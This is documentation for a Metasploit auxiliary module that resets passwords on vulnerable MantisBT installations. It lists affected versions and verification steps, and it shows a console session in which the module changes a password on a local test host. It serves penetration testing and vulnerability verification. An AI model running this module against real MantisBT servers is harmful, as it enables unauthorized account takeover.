## Vulnerable Application

MantisBT before 1.3.10, 2.2.4, and 2.3.1, that can be downloaded
on
[Sourceforge](https://sourceforge.net/projects/mantisbt/files/mantis-stable/).

## Verification Steps

  1. Install the vulnerable software
  2. Start msfconsole
  3. Do: ```use auxiliary/admin/http/mantisbt_password_reset```
  4. Do: ```set rhost```
  5. Do: ```run```
  6. If the system is vulnerable, the module should tell you that the password
     was successfully changed.

## Scenarios

  ```
   msf > use auxiliary/admin/http/mantisbt_password_reset
   msf auxiliary(mantisbt_password_reset) > set rport 8082
   rport => 8082
   msf auxiliary(mantisbt_password_reset) > set rhost 127.0.0.1
   rhost => 127.0.0.1
   msf auxiliary(mantisbt_password_reset) > run
   
   [+] Password successfully changed to 'ndOQTmhQ'.
   [*] Auxiliary module execution completed
   msf auxiliary(mantisbt_password_reset) > 
  ```
